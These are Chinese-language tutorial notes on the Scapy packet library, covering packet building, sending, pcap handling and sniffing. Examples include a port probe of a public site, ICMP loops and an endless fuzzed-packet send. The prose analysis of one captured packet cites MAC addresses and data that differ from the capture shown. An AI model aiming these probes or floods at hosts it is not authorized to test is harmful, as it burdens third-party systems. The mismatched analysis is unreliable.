

<!-- toc -->

* [Scapy](#scapy)
  * [概述](#概述)
    * [介绍](#介绍)
    * [主要功能](#主要功能)
    * [安装](#安装)
    * [ubuntu](#ubuntu)
  * [基本使用](#基本使用)
    * [ls()](#ls)
    * [lsc()](#lsc)
    * [conf](#conf)
    * [help()](#help)
    * [show()](#show)
    * [sprintf()](#sprintf)
  * [创建、发送、接收数据包](#创建-发送-接收数据包)
    * [创建数据包](#创建数据包)
  * [发送、接收数据包](#发送-接收数据包)
    * [三层数据包](#三层数据包)
    * [DNS Amplification Attack](#dns-amplification-attack)
  * [Wireless frame injection](#wireless-frame-injection)
  * [Related Links](#related-links)

<!-- toc stop -->


# Scapy #

## 概述 ##
### 介绍 ###
Scapy是一个可以让用户发送、侦听和解析并伪装网络报文的Python程序。这些功能可以用于制作侦测、扫描和攻击网络的工具；

Scapy 是一个强大的操纵报文的交互程序。它可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。Scapy 可以轻松地做到像扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)这样的传统任务。它可以代替hping,arpspoof,arp-sk,arping,p0f 甚至是部分的Namp,tcpdump和tshark 的功能；最重要的他还有很多更优秀的特性——发送无效数据帧、注入修改的802.11数据帧、在WEP上解码加密通道（VOIP）、ARP缓存攻击（VLAN） 等，这也是其他工具无法处理完成的。

### 主要功能 ###
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/59714703e5ed2008e27f2be1012c3d8b.jpg)

**限制：Scapy提供的协议层只到TCP层，没有实现HTTP层 -- “在传输层以下的所有网络操作都可以用 Scapy 解决“；**

### 安装 ###
(2017/9/13)scapy官方目前最新只支持py2.7.x，不支持py3，因此scapy的安装需要在py2.7下进行；   
但有开发者提供了第三方的scapy，即scapy-python3，支持py3；

#### Kali ####
Scapy在kali linux 2.0 以上的版本中默认已经被安装，可直接使用；

### ubuntu ###
Scapy 可以在 Linux 上原生运行，不需要libdnet和libpcap；
```shell
$ pip install scapy
```

#### Windows ####
https://scapy.readthedocs.io/en/latest/installation.html#windows 
Scapy 主要是为类 Unix 系统开发的，并且在这些平台上能正常工作，而在Windows下scapy需要安装一些额外的依赖包：
- [Python](http://www.python.org/): [python-2.7.13.amd64.msi](https://www.python.org/ftp/python/2.7.13/python-2.7.13.amd64.msi) (64bits) or [python-2.7.13.msi](https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi) (32bits). Afterinstallation, add the Python installation directory and its Scriptssubdirectory to your PATH. Depending on your Python version, the defaults wouldbe C:\Python27 and C:\Python27\Scriptsrespectively.
- [Npcap](https://nmap.org/npcap/): [the latest version](https://nmap.org/npcap/#download). Default values arerecommanded. Scapy will also work with Winpcap.
- [pyreadline](https://pypi.python.org/pypi/pyreadline): Depending on theinstalled version of Python [pyreadline-2.1.win-amd64.exe](https://pypi.python.org/packages/8b/13/bed49b87af0b4f345b4e54897b5ab6a4b848e4dd300ec4195a0016b8650c/pyreadline-2.1.win-amd64.exe)(64bits) or [pyreadline-2.1.win32.exe](https://pypi.python.org/packages/bc/ca/316035ec616c08979bbed47fb25b843415cf2d118a2f95f55173334300a6/pyreadline-2.1.win32.exe) (32bits)
- [Scapy](http://www.secdev.org/projects/scapy/): [latest developmentversion](https://github.com/secdev/scapy/archive/master.zip) fromthe [Git repository](https://github.com/secdev/scapy). Unzip the archive, opena command prompt in that directory and run “python setup.py install”.


#### 可选包的安装 ####
https://scapy.readthedocs.io/en/latest/installation.html#optional-packages 
```
pip install numpy pyx graphviz vpython cryptography
```

## 基本使用 ##
scapy支持两种使用方式：
- 从终端键入scapy，进入交互模式；
- 编写py脚本，使用 `from scapy.all import *` 导入scapy；
注意：不要使用这种方式导入包：`from scapy import *`；

### ls() ###
ls() 函数显示scapy支持的所有协议；     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/9cf9dead7895dcc563cb2a4e27c35229.jpg)

ls() 函数的参数还可以是上面支持的协议中的任意一个的类型属性，也可以是任何一个具体的数据包，如ls(TCP),ls(newpacket)等；     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/521839b3d93efdd63d47f27ce4ff8b3d.jpg)

### lsc() ###
lsc() 列出scapy支持的所有的命令；     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/f03037083219b2144844cd19ff2d17cb.jpg)

### conf ###
conf变量保存了scapy的配置信息，可显示所有的配置信息；     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/57c2f20652d1f6c3a12e639cc417db07.jpg)


### help() ###
help()显示某一命令的使用帮助，如help(sniff)：     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/dcf82802685db07ff4adc32d131b8d71.jpg)



### show() ###
show() 显示指定数据包的详细信息；     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/1d4311cd12ebeecf4adf2de77bb0016f.jpg)


注意：
display() 可以简单查看当前数据包的各个参数的取值情况，效果与 show() 基本相同；

### sprintf() ###
sprintf()输出某一层某个参数的取值，如果不存在就输出”??”；

具体的format格式是：
> %[[fmt][r],][layer[:nb].]field%

说明：
- layer:协议层的名字，如Ether、IP、Dot11、TCP等；
- filed:需要显示的参数；
- nb:当有两个协议层有相同的参数名时，nb用于到达你想要的协议层；
- r:是一个标志；当使用r标志时，意味着显示的是参数的原始值。例如，TCP标志中使用人类可阅读的字符串’SA’表示SYN和ACK标志，而其原始值是 18；     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/23ce616bf3ddd858c8feb3e4ee2b4256.jpg)


## 创建、发送、接收数据包 ##
### 创建数据包 ###
Scapy的数据包创建是按照 TCP/IP 四层参考模型， Scapy为每一层都提供了相应的类，创建数据包实际上就是将这些类实例化，然后调用类的方法或改变类的参数值进行操作；

各层的协议都有各自的类构造函数，如 IP()、TCP()、UDP() 等，每个类构造函数的参数可以使用 ls(函数名) 来查看，如ls(TCP)；
#### 基本操作 ####
实例化一个 IP 模块对象
```python
>>> data = IP()
>>> data
<IP  |>
# 查看对象的所有信息
>>> data.show()
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= ip
  chksum= None
  src= 127.0.0.1
  dst= 127.0.0.1
  \options\
```

指定参数实例化 IP 模块对象
```python
>>> data = IP(dst="172.16.2.79")
>>> data
<IP  dst=172.16.2.79 |>
# 查看对象的所有信息
>>> data.show()
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= ip
  chksum= None
  src= 172.16.2.91
  dst= 172.16.2.79
  \options\
```


修改对象属性/数据包字段（没有修改的字段/属性则使用默认值）     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/a80e14abbe2679316ac52478b4501a96.jpg)


查看数据包某一层的字段
```python
In [9]: package.getlayer(IP).fields
Out[9]: {'dst': Net('www.baidu.com'), 'ttl': 1}
```

#### 组合创建 ####
用 “/” 符号表示两个协议层的组合，如 IP()/TCP()、Ether()/IP()/TCP()、IP()/TCP()/”GET / HTTP/1.0\r\n” （数据部分可以直接使用字符串）；

例：
```python
In [1]: package = IP(dst="www.baidu.com",ttl=1)/ICMP()

In [2]: package
Out[2]: <IP  frag=0 ttl=1 proto=icmp dst=Net('www.baidu.com') |<ICMP  |>>

In [3]: package.show()
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags= # 缺省为空
  frag= 0
  ttl= 1
  proto= icmp
  chksum= None # 构造包实例时会使用缺省算法自动计算校验和，无须人为参与
  src= 192.168.1.144
  dst= Net('www.baidu.com')
  \options\
###[ ICMP ]###
     type= echo-request
     code= 0
     chksum= None # 构造包实例时会使用缺省算法自动计算校验和，无须人为参与
     id= 0x0
     seq= 0x0
```


#### 类型转换 ####
https://scapy.readthedocs.io/en/latest/usage.html#importing-and-exporting-data 
每一个数据包都可以被建立或分解，转换数据类型；

例：
```python
# 将IP包对象转换为Unicode字符串
>>> str(IP())
'E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01'
# 使用Unicode字符串构造IP包对象
# 在Python中_（下划线）是上一条语句执行的结果
>>> IP(_)
<IP version=4L ihl=5L tos=0x0 len=20 id=1 flags= frag=0L ttl=64 proto=IP
 chksum=0x7ce7 src=127.0.0.1 dst=127.0.0.1 |>

# 将数据包对象转换为十六进制输出
>>>  a=Ether()/IP(dst="www.slashdot.org")/TCP()/"GET /index.html HTTP/1.0 \n\n"
>>>  hexdump(a)
00 02 15 37 A2 44 00 AE F3 52 AA D1 08 00 45 00  ...7.D...R....E.
00 43 00 01 00 00 40 06 78 3C C0 A8 05 15 42 23  .C....@.x<....B#
FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.
20 00 BB 39 00 00 47 45 54 20 2F 69 6E 64 65 78   ..9..GET /index
2E 68 74 6D 6C 20 48 54 54 50 2F 31 2E 30 20 0A  .html HTTP/1.0 .
0A                                               .
>>> b=str(a)
>>> b
'\x00\x02\x157\xa2D\x00\xae\xf3R\xaa\xd1\x08\x00E\x00\x00C\x00\x01\x00\x00@\x06x<\xc0
 \xa8\x05\x15B#\xfa\x97\x00\x14\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00
 \xbb9\x00\x00GET /index.html HTTP/1.0 \n\n'
>>> c=Ether(b)
>>> c
<Ether dst=00:02:15:37:a2:44 src=00:ae:f3:52:aa:d1 type=0x800 |<IP version=4L
 ihl=5L tos=0x0 len=67 id=1 flags= frag=0L ttl=64 proto=TCP chksum=0x783c
 src=192.168.5.21 dst=66.35.250.151 options='' |<TCP sport=20 dport=80 seq=0L
 ack=0L dataofs=5L reserved=0L flags=S window=8192 chksum=0xbb39 urgptr=0
 options=[] |<Raw load='GET /index.html HTTP/1.0 \n\n' |>>>>

# 使用hide_defaults()方法可以不显示具有默认值的字段：
>>> c.hide_defaults()
>>> c 
<Ether dst=00:0f:66:56:fa:d2 src=00:ae:f3:52:aa:d1 type=0x800 |<IP ihl=5L len=67
 frag=0 proto=TCP chksum=0x783c src=192.168.5.21 dst=66.35.250.151 |<TCP dataofs=5L
 chksum=0xbb39 options=[] |<Raw load='GET /index.html HTTP/1.0 \n\n' |>>>>
```


#### 随机化默认值 ####
scapy提供了fuzz() 函数，用于随机改变数据包中的默认值，以增强数据包的隐蔽性；

例：
```
>>> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
................^C
Sent 16 packets.
```


#### 读写pcap文件 ####
##### wrpcap() #####

wrpcap() 函数用于将抓取的数据包list写入pcap文件，持久化存储；

wrpcap(“xxxx.pcap”, packages)

例：
```
root@kali:~# scapy
Welcome to Scapy (unknown.version)
>>> re = sniff(count=4)
>>> re
<Sniffed: TCP:1 UDP:0 ICMP:0 Other:3>
>>> wrpcap("re.pcap", re)
>>> exit()
root@kali:~# ls -l re.pcap 
-rw-r--r-- 1 root root 380 Sep 13 21:39 re.pcap
```




##### rdpcap() #####

rdpcap()函数用于读取本地的pcap文件，以package_list存储到内存中；

例：
```
>>> read_data = rdpcap("re.pcap")
>>> read_data
<re.pcap: TCP:1 UDP:0 ICMP:0 Other:3>

>>> read_data[0]
<Ether  dst=00:0c:29:78:8d:ae src=28:c2:dd:27:90:2f type=0x800 |<IP  version=4L ihl=5L tos=0x0 len=40 id=32684 flags=DF frag=0L ttl=128 proto=tcp chksum=0xf6bd src=192.168.1.127 dst=192.168.1.150 options=[] |<TCP  sport=11627 dport=ssh seq=884128453 ack=2660789838 dataofs=5L reserved=0L flags=A window=2049 chksum=0xf98d urgptr=0 |<Padding  load='\x00\x00\x00\x00\x00\x00' |>>>>
>>> read_data[3]
<Ether  dst=33:33:00:00:00:fb src=28:c2:dd:27:90:2f type=0x86dd |<IPv6  version=6L tc=0L fl=0L plen=32 nh=Hop-by-Hop Option Header hlim=1 src=fe80::3096:3c7c:d704:ac61 dst=ff02::fb |<IPv6ExtHdrHopByHop  nh=ICMPv6 len=0 autopad=On options=[<RouterAlert  otype=Router Alert [00: skip, 0: Don't change en-route] optlen=2 value=Datagram contains a MLD message |>, <PadN  otype=PadN [00: skip, 0: Don't change en-route] optlen=0 |>] |<ICMPv6MLReport  type=MLD Report code=0 cksum=0x8db7 mrd=0 reserved=0 mladdr=ff02::fb |>>>>

>>> read_data.show()
0000 Ether / IP / TCP 192.168.1.127:11627 > 192.168.1.150:ssh A / Padding
0001 Ether / 192.168.1.127 > 224.0.0.251 igmp / Raw / Padding
0002 Ether / fe80::1eb7:2cff:fe13:ee51 > ff02::1 (0) / IPv6ExtHdrHopByHop / ICMPv6MLQuery
0003 Ether / fe80::3096:3c7c:d704:ac61 > ff02::fb (0) / IPv6ExtHdrHopByHop / ICMPv6MLReport

>>> read_data[3].show()
###[ Ethernet ]### 
  dst= 33:33:00:00:00:fb
  src= 28:c2:dd:27:90:2f
  type= 0x86dd
###[ IPv6 ]### 
     version= 6L
     tc= 0L
     fl= 0L
     plen= 32
     nh= Hop-by-Hop Option Header
     hlim= 1
     src= fe80::3096:3c7c:d704:ac61
     dst= ff02::fb
###[ IPv6 Extension Header - Hop-by-Hop Options Header ]### 
        nh= ICMPv6
        len= 0
        autopad= On
        \options\
         |###[ Router Alert ]### 
         |  otype= Router Alert [00: skip, 0: Don't change en-route]
         |  optlen= 2
         |  value= Datagram contains a MLD message
         |###[ PadN ]### 
         |  otype= PadN [00: skip, 0: Don't change en-route]
         |  optlen= 0
         |  optdata= ''
###[ MLD - Multicast Listener Report ]### 
           type= MLD Report
           code= 0
           cksum= 0x8db7
           mrd= 0
           reserved= 0
           mladdr= ff02::fb
```


#### 图形转储 ####
如果安装了PyX，可以转换为数据包对象为PostScript / PDF 文件；   
https://scapy.readthedocs.io/en/latest/usage.html#graphical-dumps-pdf-ps 	


## 发送、接收数据包 ##

### 三层数据包 ###
使用发送三层数据包的函数时，scapy 会自动处理路由和二层信息；

#### send() ####
send() 发送三层数据包，没有接收响应的功能；

例：     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/d8d25ec5be11e0e26a911cdfe96b6b45.jpg)

#### sr() ####
sr() 即 send and receive，用于发送三层数据包，并等待接收一个或多个的数据包响应，返回一个包含两个列表的tuple：第一个就是发送的数据包及其应答组成的列表，第二个是无应答数据包组成的列表；

- sr() 返回结果的数据结构：     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/500154f307d65dbde0d438f66a70c3aa.jpg)
sr() 返回一个tuple：([(收到响应的请求包1，收到响应的响应包1), (收到响应的请求包2，收到响应的响应包2), ...], [未收到响应的请求包...])


例：向www.baidu.org发送ttl分别由5到10的6个ICMP数据包     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/fed39859c616ca34e6058c2dabb0f8e4.jpg)

![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/f7feda395a2de2dee0dda4d8b9b5a075.jpg)

例：向多个端口发送数据包
```
>>> sr(IP(dst="www.baidu.com")/TCP(dport=[21, 22, 23]))
Begin emission:
.Finished to send 3 packets.
.......^C
Received 8 packets, got 0 answers, remaining 3 packets
(<Results: TCP:0 UDP:0 ICMP:0 Other:0>, <Unanswered: TCP:3 UDP:0 ICMP:0 Other:0>)
```

例：连续发送ttl=1,2,3,4四个包
```
>>> p=sr(IP(dst="www.baidu.com",ttl=(1,4))/ICMP())
Begin emission:
....*.*Finished to send 4 packets.
.*.*
Received 11 packets, got 4 answers, remaining 0 packets
>>> p
(<Results: TCP:0 UDP:0 ICMP:4 Other:0>, <Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>)
>>> p[0].show()
0000 IP / ICMP 172.16.2.91 > 180.97.33.107 echo-request 0 ==> IP / ICMP 172.16.2.20 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror
0001 IP / ICMP 172.16.2.91 > 180.97.33.107 echo-request 0 ==> IP / ICMP 121.225.2.1 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror
0002 IP / ICMP 172.16.2.91 > 180.97.33.107 echo-request 0 ==> IP / ICMP 218.2.151.29 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror / Padding
0003 IP / ICMP 172.16.2.91 > 180.97.33.107 echo-request 0 ==> IP / ICMP 202.102.69.70 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror / Padding
```

例：
```
>>> ans, noans = sr(IP(dst="192.168.1.1")/TCP(dport=[21,22,23,24,25]))
Begin emission:
............Finished to send 5 packets.
.****.*
Received 19 packets, got 5 answers, remaining 0 packets
>>> ans
<Results: TCP:5 UDP:0 ICMP:0 Other:0>
>>> noans
<Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>
>>> ans.summary()
IP / TCP 192.168.1.150:ftp_data > 192.168.1.1:ftp S ==> IP / TCP 192.168.1.1:ftp > 192.168.1.150:ftp_data RA / Padding
IP / TCP 192.168.1.150:ftp_data > 192.168.1.1:ssh S ==> IP / TCP 192.168.1.1:ssh > 192.168.1.150:ftp_data SA / Padding
IP / TCP 192.168.1.150:ftp_data > 192.168.1.1:24 S ==> IP / TCP 192.168.1.1:24 > 192.168.1.150:ftp_data RA / Padding
IP / TCP 192.168.1.150:ftp_data > 192.168.1.1:telnet S ==> IP / TCP 192.168.1.1:telnet > 192.168.1.150:ftp_data RA / Padding
IP / TCP 192.168.1.150:ftp_data > 192.168.1.1:smtp S ==> IP / TCP 192.168.1.1:smtp > 192.168.1.150:ftp_data RA / Padding
>>> noans.summary()
```

#### sr1() ####

sr1() 即 send and receive one，用于发送三层数据包（如IP、ARP），并等待接收一个数据包的响应；   
**sr1() 是最常用的发送并接收数据包函数；**

例：
```
>>> q=sr1(IP(dst="www.baidu.com",ttl=(1,4))/ICMP())
Begin emission:
.....*.**Finished to send 4 packets.
..*
Received 12 packets, got 4 answers, remaining 0 packets
>>> q
<IP  version=4L ihl=5L tos=0xc0 len=56 id=30311 flags= frag=0L ttl=128 proto=icmp chksum=0x670e src=172.16.2.20 dst=172.16.2.91 options=[] |<ICMP  type=time-exceeded code=ttl-zero-during-transit chksum=0xf4ff reserved=0 length=0 unused=None |<IPerror  version=4L ihl=5L tos=0x0 len=28 id=1 flags= frag=0L ttl=1 proto=icmp chksum=0x35a8 src=172.16.2.91 dst=180.97.33.108 options=[] |<ICMPerror  type=echo-request code=0 chksum=0xf7ff id=0x0 seq=0x0 |>>>>
>>> q.show();
###[ IP ]###
  version= 4L
  ihl= 5L
  tos= 0xc0
  len= 56
  id= 30311
  flags=
  frag= 0L
  ttl= 128
  proto= icmp
  chksum= 0x670e
  src= 172.16.2.20
  dst= 172.16.2.91
  \options\
###[ ICMP ]###
     type= time-exceeded
     code= ttl-zero-during-transit
     chksum= 0xf4ff
     reserved= 0
     length= 0
     unused= None
###[ IP in ICMP ]###
        version= 4L
        ihl= 5L
        tos= 0x0
        len= 28
        id= 1
        flags=
        frag= 0L
        ttl= 1
        proto= icmp
        chksum= 0x35a8
        src= 172.16.2.91
        dst= 180.97.33.108
        \options\
###[ ICMP in ICMP ]###
           type= echo-request
           code= 0
           chksum= 0xf7ff
           id= 0x0
           seq= 0x0
```

<!-- TODO -->
Q：发送的包若是不止一个，则一直输出省略号，需要按control+c终止或使用timeout，但在Windows中，按control+c会导致scapy退出，如何解决？？？     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/27ad25a3144ae5207fba1f030831b522.jpg)


#### srloop() ####
循环发送三层数据包并接收响应数据包；

例：
```
在执行时将会不停的ping百度
>>> p=srloop(IP(dst="www.baidu.com",ttl=1)/ICMP())
RECV 1: IP / ICMP 172.16.2.20 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror
RECV 1: IP / ICMP 172.16.2.20 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror
RECV 1: IP / ICMP 172.16.2.20 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror
^C
Sent 3 packets, received 3 packets. 100.0% hits.
```

在执行时每隔3秒ping一次，一共执行两次
```
>>> p=srloop(IP(dst="www.baidu.com",ttl=1)/ICMP(),inter=3,count=2)
RECV 1: IP / ICMP 172.16.2.20 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror
RECV 1: IP / ICMP 172.16.2.20 > 172.16.2.91 time-exceeded ttl-zero-during-transit / IPerror / ICMPerror

Sent 2 packets, received 2 packets. 100.0% hits.
```





### 二层数据包 ###
使用函数发送二层数据包时，scapy不会干预二层信息的配置；

#### sendp() ####
sendp() 发送二层数据包，没有响应接收功能；

例：     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/94cbed730665b36703245cf42f731910.jpg)






#### srp() ####
srp() 用于发送二层数据包（如Ethernet、802.3），并等待接收一个或多个响应数据包；



#### srp1() ####

srp1() 用于发送二层数据包（如Ethernet、802.3），并等待接收一个响应数据包；

例：     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/90e60f3fbba41ff1e02e16b26106355a.jpg)









#### srploop() ####
srploop() 用于循环发送二层数据包，并等待接收响应数据包；

例：     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/f8620aeb8bc5e50d8819b7b628132d4f.jpg)



## 数据嗅探与过滤 ##

### sniff() ###
Scapy 的数据嗅探一般使用 sniff()函数，该函数抓取数据包后返回package的list；

> sniff (count=0, store=1, offline=None, prn=None,lfilter=None, L2socket=None, timeout=None, opened_socket=None,stop_filter=None, iface=None, *arg, **karg)

- Sniff packets
​sniff([count=0,][prn=None,][store=1,][offline=None,][lfilter=None,] +L2ListenSocket args) -> list of packets

- 参数说明（加粗的为常用参数）：
	- **filter: 捕获包类型过滤器，如只捕获ICMP数据包，则filter=”ICMP”；只捕获80端口的TCP数据包，则filter=”TCP and (port 80)”；**
	- **iface: 表示使用的网卡接口，如果没有指定interface，则会在所有的interface上进行嗅探，因此若有多个NIC，必须指定iface；**
	- **count: number of packets to capture. 0 means infinity，若不指定 count，scapy 会一直处于监听状态，使用 ctrl+C 中断监听；**
	- store: wether to store sniffed packets or discard them
	- **prn: function to apply to each packet. If something is returned, it is displayed. Ex: `prn = lambda x: x.summary()`**
	- lfilter: python function applied to each packet to determine if further action may be done. Ex: `lfilter = lambda x: x.haslayer(Padding)`
	- offline: pcap file to read packets from, instead of sniffing them
	- **timeout: stop sniffing after a given time (default: None)**
	- L2socket: use the provided L2socket
	- opened_socket: provide an object ready to use .recv() on
	- stop_filter: python function applied to each packet to determine if we have to stop the capture after this packet. ex: `stop_filter = lambda x: x.haslayer(TCP)`
	- iface: interface or list of interfaces (default: None for sniffing on all interfaces)


例：
抓取4个数据包，然后查看数据包内容
```
>>> re = sniff(count=4)

# 抓取到了2个TCP包，1个UDP包，1个other包
>>> re
<Sniffed: TCP:2 UDP:1 ICMP:0 Other:1>
>>> re.show()
0000 Ether / IP / TCP 192.168.1.150:ssh > 192.168.1.127:11627 PA / Raw
0001 Ether / IP / TCP 192.168.1.127:11627 > 192.168.1.150:ssh A / Padding
0002 Ether / ARP who has 192.168.1.168 says 192.168.1.104 / Padding
0003 Ether / IP / UDP 192.168.1.127:54773 > 239.255.255.250:1900 / Raw

# 分别查看各个包的内容
>>> re[0]
<Ether  dst=28:c2:dd:27:90:2f src=00:0c:29:78:8d:ae type=0x800 |<IP  version=4L ihl=5L tos=0x10 len=76 id=62487 flags=DF frag=0L ttl=64 proto=tcp chksum=0xc21e src=192.168.1.150 dst=192.168.1.127 options=[] |<TCP  sport=ssh dport=11627 seq=2660764882 ack=884119845 dataofs=5L reserved=0L flags=PA window=273 chksum=0x84a4 urgptr=0 options=[] |<Raw  load='\x00\x00\x00\x10\xdc\x0e\xf5\x92\xe7\xb5\x7f:\xb5m\xe4"\xc9>&\x8a\xdaPq\xb8\xbc\xce\xfel\x8c\xe3f\xf8x0X\xfc' |>>>>
>>> re[1]
<Ether  dst=00:0c:29:78:8d:ae src=28:c2:dd:27:90:2f type=0x800 |<IP  version=4L ihl=5L tos=0x0 len=40 id=32381 flags=DF frag=0L ttl=128 proto=tcp chksum=0xf7ec src=192.168.1.127 dst=192.168.1.150 options=[] |<TCP  sport=11627 dport=ssh seq=884119845 ack=2660764918 dataofs=5L reserved=0L flags=A window=2052 chksum=0x7c83 urgptr=0 |<Padding  load='\x00\x00\x00\x00\x00\x00' |>>>>
>>> re[2]
<Ether  dst=ff:ff:ff:ff:ff:ff src=e4:f8:9c:ff:b5:ae type=0x806 |<ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=who-has hwsrc=e4:f8:9c:ff:b5:ae psrc=192.168.1.104 hwdst=00:00:00:00:00:00 pdst=192.168.1.168 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>
>>> re[3]
<Ether  dst=01:00:5e:7f:ff:fa src=28:c2:dd:27:90:2f type=0x800 |<IP  version=4L ihl=5L tos=0x0 len=200 id=10170 flags= frag=0L ttl=1 proto=udp chksum=0xdf49 src=192.168.1.127 dst=239.255.255.250 options=[] |<UDP  sport=54773 dport=1900 len=180 chksum=0xa289 |<Raw  load='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: urn:dial-multiscreen-org:service:dial:1\r\nUSER-AGENT: Google Chrome/62.0.3164.0 Windows\r\n\r\n' |>>>>

# 证实只抓取了4个包
>>> re[4]
Traceback (most recent call last):
  File "<console>", line 1, in <module>
  File "/usr/lib/python2.7/dist-packages/scapy/plist.py", line 84, in __getitem__
    return self.res.__getitem__(item)
IndexError: list index out of range
```



### filter ###

在实际应用中，我们需要在数据嗅探的时候进行过滤操作（就如同在WireShark 中使用显示过滤器）；
sniff() 中的数据过滤主要通过 filter 参数实现；

例：
```
>>> receive = sniff(filter="tcp and host 172.16.2.135")
```

例：
```
>>> receive = sniff(iface="eth0", filter="icmp", count=3, prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))
192.168.1.150 -> 119.75.213.61
'\x1fN\xb9Y\x00\x00\x00\x00\xb8t\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'

119.75.213.61 -> 192.168.1.150
'\x1fN\xb9Y\x00\x00\x00\x00\xb8t\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'

192.168.1.150 -> 119.75.213.61
' N\xb9Y\x00\x00\x00\x00\xa4z\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'

>>> receive
<Sniffed: TCP:0 UDP:0 ICMP:3 Other:0> # 捕获了3个ICMP数据包
>>> receive.show()
0000 Ether / IP / ICMP 192.168.1.150 > 119.75.213.61 echo-request 0 / Raw
0001 Ether / IP / ICMP 119.75.213.61 > 192.168.1.150 echo-reply 0 / Raw
0002 Ether / IP / ICMP 192.168.1.150 > 119.75.213.61 echo-request 0 / Raw

>>> receive[0]
<Ether  dst=1c:b7:2c:13:ee:51 src=00:0c:29:78:8d:ae type=0x800 |<IP  version=4L ihl=5L tos=0x0 len=84 id=63122 flags=DF frag=0L ttl=64 proto=icmp chksum=0x354f src=192.168.1.150 dst=119.75.213.61 options=[] |<ICMP  type=echo-request code=0 chksum=0x961d id=0x5f2 seq=0x1 |<Raw  load='\x1fN\xb9Y\x00\x00\x00\x00\xb8t\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567' |>>>>
>>> receive[0].show()
###[ Ethernet ]### 
  dst= 1c:b7:2c:13:ee:51
  src= 00:0c:29:78:8d:ae
  type= 0x800
###[ IP ]### 
     version= 4L
     ihl= 5L
     tos= 0x0
     len= 84
     id= 63122
     flags= DF
     frag= 0L
     ttl= 64
     proto= icmp
     chksum= 0x354f
     src= 192.168.1.150
     dst= 119.75.213.61
     \options\
###[ ICMP ]### 
        type= echo-request
        code= 0
        chksum= 0x961d
        id= 0x5f2
        seq= 0x1
###[ Raw ]### 
           load= '\x1fN\xb9Y\x00\x00\x00\x00\xb8t\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'
```


在第 0 个数据包中，我们可以分析获得以下几点信息： 
1)	数据链路层：源主机的 MAC 地址为 08:00:27:24:b8:a3，而 目标主机的 MAC 地址为 5c:dd:70:97:4a:a8。且类型为 0x800（IPv4）； 
2)	网络层：网络协议的版本为 4L、IP报文头部长度 = IHL * 4、IP数据包在计算机网络中可以转发的最大跳数为64、使用的网络协议为 ICMP等； 
3)	ICMP传输的数据为：
```
d\x9a\x0cW\x00\x00\x00\x00\tF\x07\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !”#$%&\’()*+,-./01234567
```


<!-- TODO -->
### sniff HTTP Package ###
http://www.jinglingshu.org/?p=10390 
